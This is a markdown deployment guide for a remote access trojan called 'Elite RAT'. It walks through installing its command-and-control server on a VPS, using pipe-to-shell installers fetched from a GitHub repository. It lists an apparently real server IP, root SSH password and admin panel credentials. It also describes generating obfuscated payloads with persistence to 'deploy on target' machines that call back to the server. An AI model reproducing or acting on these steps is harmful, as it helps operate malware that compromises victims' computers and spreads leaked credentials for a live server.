# 🚀 ELITE RAT - VPS INSTALLATION GUIDE

## 📋 QUICK START (3 STEPS)

### Step 1: Connect to VPS
```bash
ssh root@50.21.187.77
# Password: tCY8Oswl
```

### Step 2: Run Installer
```bash
curl -s https://raw.githubusercontent.com/oranolio956/flipperflipper/main/deploy.sh | bash
```

### Step 3: Access Web Interface
```
https://50.21.187.77:5000
Username: admin
Password: EliteC2Password123!
```

---

## 🔒 SECURITY HARDENING (RECOMMENDED)

After basic installation, run security script:
```bash
curl -s https://raw.githubusercontent.com/oranolio956/flipperflipper/main/vps_security.sh | bash
```

This will:
- Change SSH port to 2222
- Create non-root admin user
- Install fail2ban (brute force protection)
- Setup automated backups
- Configure log rotation

---

## 🏥 HEALTH CHECKS

Run health check to diagnose issues:
```bash
curl -s https://raw.githubusercontent.com/oranolio956/flipperflipper/main/health_check.sh | bash
```

Or if already installed:
```bash
/opt/elite_rat/health_check.sh
```

---

## 📊 MONITORING

### Live System Monitor
```bash
/opt/elite_rat/monitor.sh
```

### Service Logs
```bash
# View logs
journalctl -u elite_rat -f

# Last 100 lines
journalctl -u elite_rat -n 100

# Logs from last hour
journalctl -u elite_rat --since="1 hour ago"
```

### Network Monitoring
```bash
# Real-time bandwidth
iftop

# Connection details
netstat -tulpn | grep -E '5000|5555'

# Active connections
ss -ant | grep -E '5000|5555'
```

---

## 🔧 COMMON COMMANDS

### Service Management
```bash
# Status
systemctl status elite_rat

# Start
systemctl start elite_rat

# Stop
systemctl stop elite_rat

# Restart
systemctl restart elite_rat

# Enable auto-start
systemctl enable elite_rat
```

### Manual Update
```bash
/opt/elite_rat/auto_update.sh
```

### Backup
```bash
/opt/elite_rat/backup.sh
```

---

## 🚨 TROUBLESHOOTING

### Service Won't Start
```bash
# Check logs
journalctl -u elite_rat -n 50

# Check Python errors
cd /opt/elite_rat
source venv/bin/activate
python start_server.py
```

### Port Already in Use
```bash
# Find process using port
lsof -i :5000
lsof -i :5555

# Kill process
kill -9 <PID>
```

### Can't Access Web Interface
```bash
# Check firewall
ufw status

# Allow ports
ufw allow 5000/tcp
ufw allow 5555/tcp

# Check SSL certificates
ls -la /opt/elite_rat/certs/
```

### Python Import Errors
```bash
cd /opt/elite_rat
source venv/bin/activate
pip install -r requirements.txt
```

---

## 🎯 PAYLOAD GENERATION

Once logged into web interface:

1. Navigate to **Payload Generator**
2. Configure:
   - **Host**: Your VPS IP (50.21.187.77)
   - **Port**: 5555
   - **Persistence**: Enable for auto-start
   - **Obfuscation**: Level 3 (maximum)
3. Click **Generate**
4. Download and deploy on target

---

## 📁 IMPORTANT DIRECTORIES

```
/opt/elite_rat/          # Main installation
/opt/elite_rat/venv/     # Python virtual environment
/opt/elite_rat/certs/    # SSL certificates
/opt/elite_rat/Core/     # Core modules
/opt/elite_rat/web/      # Web interface files
/opt/backups/            # Automated backups
/var/log/elite_rat.log   # Service logs
```

---

## 🔐 CHANGE DEFAULT PASSWORDS

### Web Interface Password
1. Login to web interface
2. Go to Settings
3. Change password

### VPS Root Password
```bash
passwd root
```

### Admin User Password (if created)
```bash
passwd elite_admin
```

---

## 🔄 AUTO-UPDATE SYSTEM

The system automatically:
- Checks GitHub every 5 minutes
- Pulls updates from main branch
- Restarts service if needed

To check update status:
```bash
tail -f /var/log/elite_rat_update.log
```

To disable auto-updates:
```bash
crontab -e
# Comment out the auto_update.sh line
```

---

## 📞 SUPPORT COMMANDS

### System Info
```bash
# OS Version
lsb_release -a

# System resources
free -h
df -h
htop

# Network info
ip addr show
curl ifconfig.me
```

### Reset Everything
```bash
# Stop service
systemctl stop elite_rat

# Remove installation
rm -rf /opt/elite_rat

# Re-run installer
curl -s https://raw.githubusercontent.com/oranolio956/flipperflipper/main/deploy.sh | bash
```

---

## ⚠️ SECURITY NOTES

1. **CHANGE ALL DEFAULT PASSWORDS IMMEDIATELY**
2. **Setup SSH keys and disable password authentication**
3. **Keep the system updated**
4. **Monitor logs regularly**
5. **Use strong passwords**
6. **Restrict access to trusted IPs only (optional)**

---

## 🎉 YOU'RE ALL SET!

Your Elite RAT C2 server is now:
- ✅ Installed and running
- ✅ Auto-updating from GitHub
- ✅ Accessible via web interface
- ✅ Ready to receive agents

Access at: **https://50.21.187.77:5000**